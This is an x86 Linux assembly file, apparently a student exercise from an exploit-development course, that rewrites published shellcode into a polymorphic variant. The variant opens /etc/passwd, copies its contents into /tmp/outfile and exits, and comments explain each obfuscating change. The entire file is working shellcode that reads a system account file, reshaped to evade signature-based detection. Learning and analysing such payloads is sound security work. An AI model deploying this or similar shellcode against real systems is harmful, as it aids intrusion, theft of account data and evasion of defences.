; SLAE - Assignment #6: Polymorphic Shellcodes (Linux/x86) - Part3
; Original: http://shell-storm.org/shellcode/files/shellcode-864.php
; Author:   Julien Ahrens (@MrTuxracer)
; Website:  http://www.rcesecurity.com 

global _start

section .text

_start:
    	;xor eax,eax
	xor ecx,ecx
    	push ecx		;mixing things up
    	push 0x64777373 	;mixing things up by spreading push instructions
	mul ecx			;clear out eax
	;push 0x61702f63
    	push 0x61702f2f		;mixing things up & move 0x2f to get /etc//passwd instead of //etc/passwd
    	;mov al,0x5
	add al,0x5		;add 0x5 to eax for syscall (sys_open)
    	;xor ecx,ecx
	;push 0x74652f2f
    	push 0x6374652f		
    	;lea ebx,[esp +1]	;this saves some bytes :)
	mov ebx,esp
    	int 0x80

    	mov ebx,eax
    	mov al,0x3		;syscall sys_read
    	mov edi,esp
    	mov ecx,edi
    	;push WORD 0xffff
    	;pop edx
	cdq			;eax sign bit = 0 (likely), so edx is set to 0x0 too
	dec dx			;to get 0xffff into edx, dec dx will happily do the job
    	int 0x80
	mov esi,eax

    	push 0x5		;syscall sys_open
    	pop eax
    	;xor ecx,ecx
    	;push ecx
	inc dx			;set edx to 0x0 again
	push edx
    	push 0x656c6966
    	push 0x74756f2f
    	push 0x706d742f
    	mov ebx,esp	
	xchg ecx,edx		;since edx is used (instead of ecx) to push 0x0 onto the stack
	mov cl,0102o
    	;push WORD 0644o
    	;pop edx
	imul edx,ecx,0x6	;get 0644o aka 0x1a4 into edx
	add edx, 0x18		;get 0644o aka 0x1a4 into edx
    	int 0x80

    	mov ebx,eax
    	;push 0x4
    	;pop eax
	mov al,0x4		;get next syscall into eax (sys_write)
    	mov ecx,edi
    	;mov edx,esi
	xchg edx,esi		;just another way
    	int 0x80

    	;xor eax,eax
    	xor ebx,ebx		;clear ebx
	mul ebx			;clear eax
    	;mov al,0x1
	inc eax			;set syscall to 0x1 (sys_exit)
    	mov bl,0x5
    	int 0x80
